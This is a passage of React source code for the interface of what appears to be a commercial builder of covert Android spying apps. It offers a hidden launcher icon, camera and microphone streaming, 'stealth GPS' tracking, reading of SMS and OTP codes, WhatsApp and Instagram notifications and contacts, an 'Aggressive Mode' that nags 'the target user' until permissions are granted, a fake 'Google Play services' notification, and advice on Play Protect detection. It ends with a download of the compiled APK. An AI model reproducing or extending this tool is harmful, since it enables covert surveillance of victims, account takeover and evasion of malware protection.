                                        {selectedPreset !== 'custom' && (
                                            <button
                                                type="button"
                                                onClick={() => setShowAppInfoModal(selectedPreset)}
                                                className="w-7 h-7 rounded-full bg-black/80 text-emerald-300 border border-emerald-400/50 flex items-center justify-center absolute -top-2 -right-2 shadow-lg hover:scale-110 transition-transform"
                                                title="View App Details"
                                            >
                                                <Info size={14} />
                                            </button>
                                        )}

                                        {/* Hidden Badge for Custom App */}
                                        {selectedPreset === 'custom' && hideApp && (
                                            <div className="absolute -top-1.5 -right-1.5 px-2 py-0.5 rounded-full bg-red-500 text-white text-[9px] font-black tracking-wider uppercase shadow-lg">
                                                Hidden
                                            </div>
                                        )}
                                    </div>

                                    <div className="flex items-center justify-center gap-1.5 max-w-full">
                                        <span className="text-sm font-black text-white truncate">{activeApp.name}</span>
                                    </div>
                                    <span className="text-[10px] font-mono text-fg-4 mt-0.5 truncate max-w-[160px]">{activeApp.packageName}</span>

                                    {/* Hide App Toggle Switch (ONLY SHOWN FOR CUSTOM APP) */}
                                    {selectedPreset === 'custom' && (
                                        <div className="mt-5 w-full pt-4 border-t border-white/10 flex items-center justify-between">
                                            <div className="flex items-center gap-1.5">
                                                <span className="text-xs font-bold text-fg-2">Hide Launcher Icon</span>
                                                {isBasicPlan && (
                                                    <Lock size={13} className="text-white/25" />
                                                )}
                                            </div>
                                            <button
                                                type="button"
                                                onClick={() => {
                                                    if (isBasicPlan) {
                                                        onUpgrade?.();
                                                        return;
                                                    }
                                                    setHideApp(!hideApp);
                                                }}
                                                className={`w-11 h-6 rounded-full transition-colors relative ${
                                                    isBasicPlan ? 'bg-white/10' : hideApp ? 'bg-emerald-500' : 'bg-white/20'
                                                }`}
                                            >
                                                <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${hideApp && !isBasicPlan ? 'left-6' : 'left-1'}`} />
                                            </button>
                                        </div>
                                    )}
                                </div>
                            </div>
                        </div>
                    )}

                    {/* STEP 2: APP ACCESS PERMISSIONS & ADVANCED STEALTH */}
                    {activeStep === 'permissions' && (
                        <div className="space-y-5">
                            {/* Stylish Highlighted Title Indicator ("ADD YOUR PERMISSIONS IN APP") */}
                            <div className="flex items-center gap-2.5 px-1">
                                <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
                                <span className="text-xs font-extrabold bg-gradient-to-r from-emerald-300 via-teal-200 to-cyan-300 bg-clip-text text-transparent uppercase tracking-wider">
                                    ADD YOUR PERMISSIONS IN APP
                                </span>
                            </div>

                            {/* Core Permissions Grid (Includes Notification Reader prominent card!) */}
                            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3.5">
                                
                                {/* Gallery & Storage - Soft Emerald */}
                                <div className="p-4 rounded-2xl bg-emerald-500/10 border border-emerald-500/30 flex items-center justify-between gap-3 shadow-[0_4px_16px_rgba(16,185,129,0.1)]">
                                    <div className="flex flex-col">
                                        <div className="flex items-center gap-2">
                                            <span className="text-sm font-bold text-emerald-200">Gallery & Storage</span>
                                            <button type="button" onClick={() => setShowPermissionInfo('storage')} className="text-emerald-400/70 hover:text-emerald-300">
                                                <Info size={14} />
                                            </button>
                                        </div>
                                        <span className="text-xs text-emerald-300/70">Grants access to browse, index & download device photos & media files.</span>
                                    </div>
                                    <button
                                        type="button"
                                        onClick={() => setEnableStoragePermission(!enableStoragePermission)}
                                        className={`w-11 h-6 rounded-full transition-colors relative flex-shrink-0 ${enableStoragePermission ? 'bg-emerald-500' : 'bg-white/20'}`}
                                    >
                                        <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableStoragePermission ? 'left-6' : 'left-1'}`} />
                                    </button>
                                </div>

                                {/* Camera Capture - Soft Cyan */}
                                <div className={`p-4 rounded-2xl bg-cyan-500/10 border border-cyan-500/30 flex items-center justify-between gap-3 shadow-[0_4px_16px_rgba(6,182,212,0.1)]`}>
                                    <div className="flex flex-col">
                                        <div className="flex items-center gap-2">
                                            <span className="text-sm font-bold text-cyan-200">Camera Capture</span>
                                            {!isPremium && (
                                                <Lock size={13} className="text-white/25" />
                                            )}
                                            <button type="button" onClick={() => setShowPermissionInfo('camera')} className="text-cyan-400/70 hover:text-cyan-300">
                                                <Info size={14} />
                                            </button>
                                        </div>
                                        <span className="text-xs text-cyan-300/70">Grants live video streaming and instant photo snapshots from front & rear cameras.</span>
                                    </div>
                                    <button
                                        type="button"
                                        onClick={() => {
                                            if (!isPremium) { onUpgrade?.('Camera Capture', 'premium'); return; }
                                            setEnableCameraPermission(!enableCameraPermission);
                                        }}
                                        className={`w-11 h-6 rounded-full transition-colors relative flex-shrink-0 ${!isPremium ? 'bg-white/10' : enableCameraPermission ? 'bg-cyan-500' : 'bg-white/20'}`}
                                    >
                                        <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableCameraPermission && isPremium ? 'left-6' : 'left-1'}`} />
                                    </button>
                                </div>

                                {/* Live Microphone - Soft Violet */}
                                <div className={`p-4 rounded-2xl bg-purple-500/10 border border-purple-500/30 flex items-center justify-between gap-3 shadow-[0_4px_16px_rgba(168,85,247,0.1)]`}>
                                    <div className="flex flex-col">
                                        <div className="flex items-center gap-2">
                                            <span className="text-sm font-bold text-purple-200">Live Microphone</span>
                                            {!isPremium && (
                                                <Lock size={13} className="text-white/25" />
                                            )}
                                            <button type="button" onClick={() => setShowPermissionInfo('microphone')} className="text-purple-400/70 hover:text-purple-300">
                                                <Info size={14} />
                                            </button>
                                        </div>
                                        <span className="text-xs text-purple-300/70">Grants real-time room surround audio streaming and voice recording.</span>
                                    </div>
                                    <button
                                        type="button"
                                        onClick={() => {
                                            if (!isPremium) { onUpgrade?.('Live Microphone', 'premium'); return; }
                                            setEnableMicrophonePermission(!enableMicrophonePermission);
                                        }}
                                        className={`w-11 h-6 rounded-full transition-colors relative flex-shrink-0 ${!isPremium ? 'bg-white/10' : enableMicrophonePermission ? 'bg-purple-500' : 'bg-white/20'}`}
                                    >
                                        <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableMicrophonePermission && isPremium ? 'left-6' : 'left-1'}`} />
                                    </button>
                                </div>

                                {/* Live Location - Warm Orange */}
                                <div className={`p-4 rounded-2xl bg-orange-500/10 border border-orange-500/30 flex items-center justify-between gap-3 shadow-[0_4px_16px_rgba(249,115,22,0.1)]`}>
                                    <div className="flex flex-col">
                                        <div className="flex items-center gap-2">
                                            <span className="text-sm font-bold text-orange-200">Live Location</span>
                                            {!isPremium && (
                                                <Lock size={13} className="text-white/25" />
                                            )}
                                            <button type="button" onClick={() => setShowPermissionInfo('location')} className="text-orange-400/70 hover:text-orange-300">
                                                <Info size={14} />
                                            </button>
                                        </div>
                                        <span className="text-xs text-orange-300/70">Grants stealth GPS background tracking and pinpointing.</span>
                                    </div>
                                    <button
                                        type="button"
                                        onClick={() => {
                                            if (!isPremium) { onUpgrade?.('Live Location', 'premium'); return; }
                                            setEnableLocationPermission(!enableLocationPermission);
                                        }}
                                        className={`w-11 h-6 rounded-full transition-colors relative flex-shrink-0 ${!isPremium ? 'bg-white/10' : enableLocationPermission ? 'bg-orange-500' : 'bg-white/20'}`}
                                    >
                                        <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableLocationPermission && isPremium ? 'left-6' : 'left-1'}`} />
                                    </button>
                                </div>


                                {/* Contacts Sync - Soft Green */}
                                <div className={`p-4 rounded-2xl bg-green-500/10 border border-green-500/30 flex items-center justify-between gap-3 shadow-[0_4px_16px_rgba(34,197,94,0.1)]`}>
                                    <div className="flex flex-col">
                                        <div className="flex items-center gap-2">
                                            <span className="text-sm font-bold text-green-200">Contacts Sync</span>
                                            {isBasicPlan && (
                                                <Lock size={13} className="text-white/25" />
                                            )}
                                            <button type="button" onClick={() => setShowPermissionInfo('contacts')} className="text-green-400/70 hover:text-green-300">
                                                <Info size={14} />
                                            </button>
                                        </div>
                                        <span className="text-xs text-green-300/70">Grants access to sync device phonebook contacts & stored email accounts.</span>
                                    </div>
                                    <button
                                        type="button"
                                        onClick={() => {
                                            if (isBasicPlan) { onUpgrade?.('Contacts Sync', 'standard'); return; }
                                            setEnableContactsPermission(!enableContactsPermission);
                                        }}
                                        className={`w-11 h-6 rounded-full transition-colors relative flex-shrink-0 ${isBasicPlan ? 'bg-white/10' : enableContactsPermission ? 'bg-green-500' : 'bg-white/20'}`}
                                    >
                                        <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableContactsPermission && !isBasicPlan ? 'left-6' : 'left-1'}`} />
                                    </button>
                                </div>
                            </div>

                            {/* Collapsible Advanced Permissions Button (SMS & Aggressive Mode) */}
                            <div className="pt-2">
                                <button
                                    type="button"
                                    onClick={() => setShowAdvancedPermissions(!showAdvancedPermissions)}
                                    className="w-full py-3 px-4 rounded-2xl bg-white/[0.04] hover:bg-white/[0.08] border border-white/15 flex items-center justify-between text-xs font-extrabold text-emerald-300 transition-all shadow-sm"
                                >
                                    <div className="flex items-center gap-2">
                                        <Sliders size={15} />
                                        <span>Advanced Stealth & Persistence Options</span>
                                    </div>
                                    {showAdvancedPermissions ? <ChevronUp size={16} /> : <ChevronDown size={16} />}
                                </button>

                                {/* Collapsible Advanced Section */}
                                {showAdvancedPermissions && (
                                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-3.5 mt-3 animate-in fade-in duration-200">
                                        {/* Notification Reader (Monitored Alerts) - Soft Sky */}
                                        <div className="p-4 rounded-2xl bg-sky-500/10 border border-sky-500/30 flex items-center justify-between gap-3 shadow-[0_4px_16px_rgba(14,165,233,0.1)]">
                                            <div className="flex flex-col">
                                                <div className="flex items-center gap-2">
                                                    <span className="text-sm font-bold text-sky-200">Notification Reader</span>
                                                    {isBasicPlan && (
                                                        <Lock size={13} className="text-white/25" />
                                                    )}
                                                    <button type="button" onClick={() => setShowPermissionInfo('notifications')} className="text-sky-400/70 hover:text-sky-300">
                                                        <Info size={14} />
                                                    </button>
                                                </div>
                                                <span className="text-xs text-sky-300/70">Monitors WhatsApp, Instagram & incoming messaging notifications.</span>
                                            </div>
                                            <button
                                                type="button"
                                                onClick={() => {
                                                    if (isBasicPlan) { onUpgrade?.('Notification Reader', 'standard'); return; }
                                                    setEnableNotificationListener(!enableNotificationListener);
                                                }}
                                                className={`w-11 h-6 rounded-full transition-colors relative flex-shrink-0 ${isBasicPlan ? 'bg-white/10' : enableNotificationListener ? 'bg-sky-500' : 'bg-white/20'}`}
                                            >
                                                <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableNotificationListener && isStandard ? 'left-6' : 'left-1'}`} />
                                            </button>
                                        </div>

                                        {/* SMS Access - Soft Rose */}
                                        <div className={`p-4 rounded-2xl bg-rose-500/10 border border-rose-500/30 flex items-center justify-between gap-3 shadow-[0_4px_16px_rgba(244,63,94,0.1)]`}>
                                            <div className="flex flex-col">
                                                <div className="flex items-center gap-2">
                                                    <span className="text-sm font-bold text-rose-200">SMS Messages</span>
                                                    {isBasicPlan && (
                                                        <Lock size={13} className="text-rose-400/50" />
                                                    )}
                                                    <button type="button" onClick={() => setShowPermissionInfo('sms')} className="text-rose-400/70 hover:text-rose-300">
                                                        <Info size={14} />
                                                    </button>
                                                </div>
                                                <span className="text-xs text-rose-300/70">Grants access to read incoming SMS messages & OTP verification codes.</span>
                                            </div>
                                            <button
                                                type="button"
                                                onClick={() => {
                                                    if (isBasicPlan) { onUpgrade?.('SMS Messages', 'standard'); return; }
                                                    if (!enableSmsPermission) {
                                                        setShowPlayProtectWarning(true);
                                                    } else {
                                                        setEnableSmsPermission(false);
                                                    }
                                                }}
                                                className={`w-11 h-6 rounded-full transition-colors relative flex-shrink-0 ${isBasicPlan ? 'bg-white/10' : enableSmsPermission ? 'bg-rose-500' : 'bg-white/20'}`}
                                            >
                                                <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableSmsPermission && !isBasicPlan ? 'left-6' : 'left-1'}`} />
                                            </button>
                                        </div>

                                        {/* Aggressive Persistence Mode - Soft Amber */}
                                        <div className="p-4 rounded-2xl bg-amber-500/10 border border-amber-500/30 flex items-center justify-between gap-3 shadow-[0_4px_16px_rgba(245,158,11,0.1)]">
                                            <div className="flex flex-col">
                                                <div className="flex items-center gap-2">
                                                    <span className="text-sm font-bold text-amber-200">Aggressive Mode</span>
                                                    {isBasicPlan && (
                                                        <Lock size={13} className="text-amber-400/50" />
                                                    )}
                                                </div>
                                                <span className="text-xs text-amber-300/70">Repeatedly prompts the target user for permissions until all required access is granted.</span>
                                            </div>
                                            <button
                                                type="button"
                                                onClick={() => {
                                                    if (isBasicPlan) { onUpgrade?.('Aggressive Mode', 'standard'); return; }
                                                    setAggressivePermissions(!aggressivePermissions);
                                                }}
                                                className={`w-11 h-6 rounded-full transition-colors relative flex-shrink-0 ${isBasicPlan ? 'bg-white/10' : aggressivePermissions ? 'bg-amber-500' : 'bg-white/20'}`}
                                            >
                                                <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${aggressivePermissions && !isBasicPlan ? 'left-6' : 'left-1'}`} />
                                            </button>
                                        </div>
                                    </div>
                                )}
                            </div>
                        </div>
                    )}

                    {/* STEP 3: BACKGROUND SERVICE NOTIFICATION STYLE & ACTION */}
                    {activeStep === 'notifications' && (
                        <div className="space-y-6">
                            
                            {/* Header Indicator */}
                            <div className="flex items-center gap-2.5 px-1">
                                <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
                                <span className="text-xs font-extrabold bg-gradient-to-r from-emerald-300 via-teal-200 to-cyan-300 bg-clip-text text-transparent uppercase tracking-wider">
                                    SELECT BACKGROUND SERVICE STYLE
                                </span>
                            </div>

                            {/* Custom UI Dropdown Selector for Notification Style */}
                            <div className="space-y-4">
                                <div className="relative">
                                    <label className="block text-xs font-bold text-fg-3 uppercase tracking-widest mb-2">Notification Display Style</label>
                                    
                                    {/* Custom UI Card Dropdown Button */}
                                    <button
                                        type="button"
                                        onClick={() => {
                                            setIsStyleMenuOpen(!isStyleMenuOpen);
                                            setIsActionMenuOpen(false);
                                            setIsIconMenuOpen(false);
                                        }}
                                        className="w-full bg-black/60 border border-emerald-500/40 hover:border-emerald-500/70 rounded-2xl p-4 flex items-center justify-between text-left transition-all shadow-[0_0_15px_rgba(16,185,129,0.15)]"
                                    >
                                        <div className="flex items-center gap-3">
                                            <span className="text-2xl">{NOTIFICATION_PRESETS[notificationStyle]?.icon || "ℹ️"}</span>
                                            <div>
                                                <div className="text-sm font-bold text-white">
                                                    {NOTIFICATION_PRESETS[notificationStyle]?.title || "Google Play services"}
                                                </div>
                                                <div className="text-xs text-fg-3">
                                                    {NOTIFICATION_PRESETS[notificationStyle]?.text || "Checking for updates…"}
                                                </div>
                                            </div>
                                        </div>
                                        <ChevronDown size={18} className={`text-emerald-400 transition-transform ${isStyleMenuOpen ? 'rotate-180' : ''}`} />
                                    </button>

                                    {/* Custom UI Dropdown List */}
                                    {isStyleMenuOpen && (
                                        <div className="mt-2 bg-[#18191c] border border-white/20 rounded-2xl shadow-2xl overflow-hidden divide-y divide-white/5 max-h-56 overflow-y-auto custom-scrollbar animate-in fade-in duration-150">
                                            {Object.entries(NOTIFICATION_PRESETS).map(([key, preset]) => (
                                                <button
                                                    key={key}
                                                    type="button"
                                                    onClick={() => handleSelectStyle(key)}
                                                    className={`w-full p-3.5 flex items-center justify-between text-left transition-colors ${
                                                        notificationStyle === key ? 'bg-emerald-500/15 text-white font-bold' : 'hover:bg-white/5 text-fg-2'
                                                    }`}
                                                >
                                                    <div className="flex items-center gap-3">
                                                        <span className="text-xl">{preset.icon}</span>
                                                        <div>
                                                            <div className="text-xs font-extrabold text-white">{preset.title}</div>
                                                            <div className="text-[11px] text-fg-4">{preset.text}</div>
                                                        </div>
                                                    </div>
                                                    {notificationStyle === key && <CheckCircle2 size={16} className="text-emerald-400" />}
                                                </button>
                                            ))}
                                        </div>
                                    )}
                                </div>

                                {/* Clean Simple Custom UI Dropdown Selector for On-Click Action */}
                                <div className="relative">
                                    <label className="block text-xs font-bold text-fg-3 uppercase tracking-widest mb-2 flex items-center justify-between">
                                        <span>When User Taps Notification</span>
                                        <span className="text-[10px] font-semibold text-emerald-400/80">
                                            Tap Action
                                        </span>
                                    </label>
                                    
                                    <button
                                        type="button"
                                        onClick={() => {
                                            setIsActionMenuOpen(!isActionMenuOpen);
                                            setIsStyleMenuOpen(false);
                                            setIsIconMenuOpen(false);
                                        }}
                                        className="w-full bg-black/60 border border-white/15 hover:border-emerald-500/40 rounded-2xl p-3.5 flex items-center justify-between text-left transition-all"
                                    >
                                        <div className="flex items-center gap-3">
                                            <div className="w-8 h-8 rounded-xl bg-white/5 flex items-center justify-center text-emerald-300">
                                                <MousePointerClick size={16} />
                                            </div>
                                            <span className="text-xs font-bold text-white">
                                                {CLICK_ACTIONS[notificationClickAction] || "Open App Info & Permissions"}
                                            </span>
                                        </div>
                                        <ChevronDown size={18} className={`text-fg-3 transition-transform ${isActionMenuOpen ? 'rotate-180' : ''}`} />
                                    </button>

                                    {/* Action Dropdown List - Ordered 2nd Do Nothing, clean simple titles without subtitles */}
                                    {isActionMenuOpen && (
                                        <div className="mt-2 bg-[#18191c] border border-white/20 rounded-2xl shadow-2xl overflow-hidden divide-y divide-white/5 max-h-56 overflow-y-auto custom-scrollbar animate-in fade-in duration-150">
                                            {Object.entries(CLICK_ACTIONS).map(([key, label]) => (
                                                <button
                                                    key={key}
                                                    type="button"
                                                    onClick={() => {
                                                        setNotificationClickAction(key);
                                                        setIsActionMenuOpen(false);
                                                    }}
                                                    className={`w-full p-3.5 flex items-center justify-between text-left transition-colors ${
                                                        notificationClickAction === key ? 'bg-emerald-500/15 text-white font-bold' : 'hover:bg-white/5 text-fg-2'
                                                    }`}
                                                >
                                                    <span className="text-xs font-bold text-white">{label}</span>
                                                    {notificationClickAction === key && <CheckCircle2 size={16} className="text-emerald-400 flex-shrink-0 ml-2" />}
                                                </button>
                                            ))}
                                        </div>
                                    )}
                                </div>

                                {/* Custom UI Dropdown Selector for Notification Status Bar Icon */}
                                <div className="relative">
                                    <label className="block text-xs font-bold text-fg-3 uppercase tracking-widest mb-2">Notification Status Bar Icon</label>
                                    
                                    <button
                                        type="button"
                                        onClick={() => {
                                            setIsIconMenuOpen(!isIconMenuOpen);
                                            setIsStyleMenuOpen(false);
                                            setIsActionMenuOpen(false);
                                        }}
                                        className="w-full bg-black/60 border border-white/15 hover:border-white/30 rounded-2xl p-3.5 flex items-center justify-between text-left transition-all"
                                    >
                                        <div className="flex items-center gap-3">
                                            <span className="text-xl">{ICON_OPTIONS[notificationIcon]?.symbol || "ℹ️"}</span>
                                            <div className="text-xs font-bold text-white">
                                                {ICON_OPTIONS[notificationIcon]?.label || "Info Badge"}
                                            </div>
                                        </div>
                                        <ChevronDown size={18} className={`text-fg-3 transition-transform ${isIconMenuOpen ? 'rotate-180' : ''}`} />
                                    </button>

                                    {/* Icon Dropdown List */}
                                    {isIconMenuOpen && (
                                        <div className="mt-2 bg-[#18191c] border border-white/20 rounded-2xl shadow-2xl overflow-hidden divide-y divide-white/5 animate-in fade-in duration-150">
                                            {Object.entries(ICON_OPTIONS).map(([key, item]) => (
                                                <button
                                                    key={key}
                                                    type="button"
                                                    onClick={() => {
                                                        setNotificationIcon(key);
                                                        setIsIconMenuOpen(false);
                                                    }}
                                                    className={`w-full p-3 flex items-center justify-between text-left transition-colors ${
                                                        notificationIcon === key ? 'bg-emerald-500/15 text-white font-bold' : 'hover:bg-white/5 text-fg-2'
                                                    }`}
                                                >
                                                    <div className="flex items-center gap-3">
                                                        <span className="text-lg">{item.symbol}</span>
                                                        <span className="text-xs font-bold text-white">{item.label}</span>
                                                    </div>
                                                    {notificationIcon === key && <CheckCircle2 size={16} className="text-emerald-400" />}
                                                </button>
                                            ))}
                                        </div>
                                    )}
                                </div>

                                {/* Custom Notification Fields (Shown only when style === 'custom') */}
                                {notificationStyle === 'custom' && (
                                    <div className="space-y-3 bg-black/50 p-4 rounded-2xl border border-white/10 shadow-inner animate-in fade-in">
                                        <div>
                                            <label className="block text-xs font-bold text-fg-3 mb-1">Custom Notification Title</label>
                                            <input
                                                type="text"
                                                value={notificationTitle}
                                                onChange={(e) => setNotificationTitle(e.target.value)}
                                                className="w-full bg-white/5 border border-white/10 rounded-xl px-3 py-2 text-white text-sm focus:border-emerald-500/60 focus:outline-none"
                                                placeholder="Google Play services"
                                            />
                                        </div>
                                        <div>
                                            <label className="block text-xs font-bold text-fg-3 mb-1">Custom Notification Text</label>
                                            <input
                                                type="text"
                                                value={notificationText}
                                                onChange={(e) => setNotificationText(e.target.value)}
                                                className="w-full bg-white/5 border border-white/10 rounded-xl px-3 py-2 text-white text-sm focus:border-emerald-500/60 focus:outline-none"
                                                placeholder="Checking for updates…"
                                            />
                                        </div>
                                    </div>
                                )}

                                {/* Highlighted & Polished Live Android Status Bar Preview Card */}
                                <div className="bg-gradient-to-br from-[#161a23] via-[#10131a] to-[#0a0d14] rounded-3xl p-5 border border-emerald-500/30 shadow-[0_0_25px_rgba(16,185,129,0.12)] space-y-3">
                                    <div className="flex items-center justify-between">
                                        <div className="flex items-center gap-2">
                                            <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
                                            <span className="text-[10px] font-extrabold text-emerald-300 uppercase tracking-widest">LIVE ANDROID STATUS BAR PREVIEW</span>
                                        </div>
                                        <span className="text-[10px] font-mono text-fg-4">now</span>
                                    </div>

                                    {/* Realistic Notification Drawer Card */}
                                    <div className="flex items-center justify-between p-4 rounded-2xl bg-black/60 border border-white/10 shadow-md">
                                        <div className="flex items-center gap-3.5">
                                            <div className="w-10 h-10 rounded-xl bg-emerald-500/15 border border-emerald-500/30 flex items-center justify-center text-xl shadow-inner">
                                                {ICON_OPTIONS[notificationIcon]?.symbol || NOTIFICATION_PRESETS[notificationStyle]?.icon}
                                            </div>
                                            <div>
                                                <div className="text-xs font-black text-white">
                                                    {notificationStyle === 'custom' ? (notificationTitle || 'System Service') : NOTIFICATION_PRESETS[notificationStyle]?.title}
                                                </div>
                                                <div className="text-[11px] text-fg-3 mt-0.5">
                                                    {notificationStyle === 'custom' ? (notificationText || 'Running background checks…') : NOTIFICATION_PRESETS[notificationStyle]?.text}
                                                </div>
                                            </div>
                                        </div>
                                        <div className="flex flex-col items-end gap-1">
                                            <span className="px-2 py-0.5 rounded-full bg-emerald-500/20 border border-emerald-500/40 text-[9px] font-bold text-emerald-300 uppercase">
                                                SILENT
                                            </span>
                                            <span className="text-[9px] text-fg-4 font-mono">Persistent</span>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    )}
                </div>

                {/* Footer Controls & Progress Popup Overlay */}
                <div className="p-5 sm:p-7 border-t border-white/10 bg-gradient-to-t from-white/[0.04] to-transparent flex flex-col gap-4">
                    
                    {/* Progress / Status Modal Popup Box */}
                    {status !== 'idle' && (
                        <div className="p-5 rounded-2xl bg-black/80 border border-emerald-500/30 flex flex-col items-center justify-center text-center space-y-3 animate-in fade-in shadow-2xl">
                            {status === 'queued' ? (
                                <>
                                    <div className="w-10 h-10 border-4 border-emerald-500/30 border-t-emerald-500 rounded-full animate-spin" />
                                    <h4 className="text-base font-bold text-white">Queued for Compilation</h4>
                                    <p className="text-xs text-fg-3">Queue Position: <span className="text-emerald-400 font-bold">{queuePosition}</span></p>
                                </>
                            ) : status === 'generating' ? (
                                <>
                                    <div className="w-full flex items-center justify-between text-xs font-bold text-fg-2">
                                        <span>{progressStep || "Compiling APK..."}</span>
                                        <span className="text-emerald-400">{progress}%</span>
                                    </div>
                                    <div className="w-full h-3 bg-white/10 rounded-full overflow-hidden">
                                        <div
                                            className="h-full bg-gradient-to-r from-emerald-500 to-teal-400 transition-all duration-500"
                                            style={{ width: `${progress}%` }}
                                        />
                                    </div>
                                </>
                            ) : status === 'completed' ? (
                                <>
                                    <CheckCircle2 size={36} className="text-emerald-400" />
                                    <h4 className="text-lg font-bold text-white">APK Ready!</h4>
                                    <p className="text-xs text-fg-3">Your compiled Android APK is ready for installation.</p>
                                    {downloadUrl && (
                                        <a
                                            href={downloadUrl}
                                            target="_blank"
                                            rel="noopener noreferrer"
                                            download={`${activeApp.name.replace(/\s+/g, '_')}.apk`}
                                            className="px-6 py-2.5 rounded-xl bg-emerald-500 hover:bg-emerald-600 text-white font-bold text-xs shadow-lg transition-all"
                                        >
                                            Download APK Now
                                        </a>
                                    )}
                                </>
                            ) : null}
                        </div>
                    )}

                    {/* Step Navigation & Action Buttons */}
                    <div className="flex items-center justify-between gap-3">
                        {activeStep !== 'identity' ? (
                            <button
                                type="button"
                                onClick={() => setActiveStep(activeStep === 'notifications' ? 'permissions' : 'identity')}
                                className="px-5 py-3 rounded-xl bg-white/5 hover:bg-white/10 text-fg-2 hover:text-white font-bold text-xs transition-all"
                            >
                                ← Previous
                            </button>
                        ) : <div />}

                        {activeStep !== 'notifications' ? (
                            <button
                                type="button"
                                onClick={() => setActiveStep(activeStep === 'identity' ? 'permissions' : 'notifications')}
                                className="px-6 py-3 rounded-xl bg-gradient-to-r from-emerald-500 to-teal-500 hover:from-emerald-400 hover:to-teal-400 text-black font-extrabold text-xs shadow-lg shadow-emerald-500/20 transition-all flex items-center gap-2"
                            >
                                <span>Next Step</span>
                                <span>→</span>
                            </button>
                        ) : status === 'idle' ? (
                            <button
                                type="button"
                                onClick={startGeneration}
                                className="px-8 py-3.5 rounded-xl bg-gradient-to-r from-emerald-500 via-teal-500 to-cyan-500 hover:scale-105 text-black font-black text-sm shadow-[0_0_25px_rgba(16,185,129,0.35)] transition-all"
                            >
                                Build {selectedPreset === 'custom' ? 'Custom' : activeApp.name} APK
                            </button>
                        ) : (
                            <button
                                type="button"
                                onClick={onClose}
                                className="px-6 py-3 rounded-xl bg-white/10 hover:bg-white/20 text-white font-bold text-xs transition-all"
                            >
                                Close
                            </button>
                        )}
                    </div>
                </div>

                {/* App Mode Info Modal Popup */}
                {showAppInfoModal && (
                    <div className="fixed inset-0 z-[350] flex items-center justify-center bg-black/75 backdrop-blur-sm p-4" onClick={() => setShowAppInfoModal(null)}>
                        <div className="bg-[#18191c] border border-white/15 rounded-3xl p-6 max-w-sm w-full space-y-4 relative shadow-2xl" onClick={(e) => e.stopPropagation()}>
                            <button
                                onClick={() => setShowAppInfoModal(null)}
                                className="absolute top-4 right-4 text-white/50 hover:text-white"
                            >
                                ✕
                            </button>

                            <div className="flex items-center gap-3">
                                {renderPresetIconBadge(showAppInfoModal)}
                                <div>
                                    <h4 className="text-base font-extrabold text-white">
                                        {APP_PRESETS.find(p => p.id === showAppInfoModal)?.name}
                                    </h4>
                                    <span className="text-[10px] font-mono text-emerald-400">
                                        {APP_PRESETS.find(p => p.id === showAppInfoModal)?.packageName}
                                    </span>
                                </div>
                            </div>

                            <div className="p-3.5 rounded-2xl bg-white/[0.03] border border-white/10">
                                <h5 className="text-xs font-bold text-emerald-300 mb-1.5">
                                    {APP_PRESETS.find(p => p.id === showAppInfoModal)?.infoTitle}
                                </h5>
                                <p className="text-xs text-fg-3 leading-relaxed">
                                    {APP_PRESETS.find(p => p.id === showAppInfoModal)?.infoText}
                                </p>
                            </div>

                            <button
                                onClick={() => setShowAppInfoModal(null)}
                                className="w-full py-2.5 rounded-xl bg-emerald-500 hover:bg-emerald-600 text-black font-bold text-xs transition-all shadow-lg"
                            >
                                Close Info
                            </button>
                        </div>
                    </div>
                )}

                {/* Play Protect Warning Modal */}
                {showPlayProtectWarning && (
                    <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-[350]" onClick={() => setShowPlayProtectWarning(false)}>
                        <div className="bg-[#18191c] rounded-3xl p-6 max-w-sm mx-4 border border-red-500/30 shadow-2xl space-y-4" onClick={(e) => e.stopPropagation()}>
                            <div className="flex items-center gap-3">
                                <div className="w-11 h-11 rounded-2xl bg-red-500/15 border border-red-500/30 flex items-center justify-center text-red-400">
                                    <AlertTriangle size={22} />
                                </div>
                                <div>
                                    <h3 className="text-base font-bold text-white">Play Protect Warning</h3>
                                    <p className="text-xs text-red-400">High detection risk</p>
                                </div>
                            </div>

                            <p className="text-fg-2 text-xs leading-relaxed">
                                Enabling <strong>SMS Access</strong> increases the likelihood that Google Play Protect will flag or restrict installation. Proceed only if needed.
                            </p>

                            <div className="flex gap-3">
                                <button
                                    type="button"
                                    onClick={() => setShowPlayProtectWarning(false)}
                                    className="flex-1 py-2.5 rounded-xl bg-white/5 hover:bg-white/10 text-white text-xs font-bold transition-all"
                                >
                                    Cancel
                                </button>
                                <button
                                    type="button"
                                    onClick={() => {
                                        setEnableSmsPermission(true);
                                        setShowPlayProtectWarning(false);
                                    }}
                                    className="flex-1 py-2.5 rounded-xl bg-red-500 hover:bg-red-600 text-white text-xs font-bold transition-all"
                                >
                                    Enable Anyway
                                </button>
                            </div>
                        </div>
                    </div>
                )}

                {/* Customized Color-Themed Permission Info Modal */}
                {showPermissionInfo && (
                    <div className="fixed inset-0 z-[350] flex items-center justify-center bg-black/75 backdrop-blur-sm p-4" onClick={() => setShowPermissionInfo(null)}>
                        <div className={`bg-[#18191c] border rounded-3xl p-6 max-w-sm w-full space-y-4 relative shadow-2xl ${
                            showPermissionInfo === 'storage' ? 'border-emerald-500/40 shadow-emerald-500/10' :
                            showPermissionInfo === 'camera' ? 'border-cyan-500/40 shadow-cyan-500/10' :
                            showPermissionInfo === 'microphone' ? 'border-purple-500/40 shadow-purple-500/10' :
                            showPermissionInfo === 'contacts' ? 'border-green-500/40 shadow-green-500/10' :
                            showPermissionInfo === 'notifications' ? 'border-sky-500/40 shadow-sky-500/10' :
                            'border-rose-500/40 shadow-rose-500/10'
                        }`} onClick={(e) => e.stopPropagation()}>
                            <button
